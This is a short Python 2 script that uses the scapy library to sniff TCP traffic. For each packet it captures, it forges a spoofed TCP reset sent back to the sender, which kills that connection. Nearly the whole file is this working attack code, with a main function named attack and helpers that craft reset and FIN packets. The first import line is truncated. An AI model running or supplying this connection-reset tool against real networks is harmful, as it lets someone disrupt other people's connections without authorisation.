
m scapy.all import *


def isHttpRequest(data):
    headers = str(data).splitlines()
    method = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
    for name in method:
        if headers[0][0:len(name)] == name:
            return 1
        return 0


def print_ip(pkt):
    print "Sip: " + pkt[IP].src
    print "Dip: " + pkt[IP].dst


def print_tcp(pkt):
    print "Sport: " + str(pkt[TCP].sport)
    print "Dport: " + str(pkt[TCP].dport) + '\n\n'


'''
def send_backward(pkt, flags):
    fake = IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
        dport=pkt[TCP].sport,
        sport=pkt[TCP].dport,
        flags="RA" if flags == 'RST' else "FA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
    )
    print fake[TCP].flags
    print_ip(fake)
    print_tcp(fake)
    send(fake, verbose=False)
'''


def send_backward_rst(pkt):
    fake = IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
        dport=pkt[TCP].sport,
        sport=pkt[TCP].dport,
        flags="RA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
    )
    send(fake, verbose=False)


def send_backward_fin(pkt):
    fake = IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
        dport=pkt[TCP].sport,
        sport=pkt[TCP].dport,
        flags="FA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
    )
    send(fake, verbose=False)


def send_forward_rst(pkt):
    fake = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
        dport=pkt[TCP].dport,
        sport=pkt[TCP].sport,
        flags="RA",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
    )
    send(fake, verbose=False)


def attack(pkt):
    layer = pkt.payload

    if pkt.getlayer(Raw):  # http or tcp with data
        print isHttpRequest(layer.load)
        print "[+]=========HTTP before sending rst============"
        # send_forward_rst(pkt)
        send_backward_rst(pkt)
        print "[+]=========HTTP after sending rst============"

    else:  # tcp with no data
        print "[+]=========TCP before sending rst============="
        # send_forward_rst(pkt)
        send_backward_rst(pkt)
        print "[+]=========TCP after sending rst============"


if __name__ == "__main__":
    sniff(filter="tcp or port 80", prn=attack, store=0)

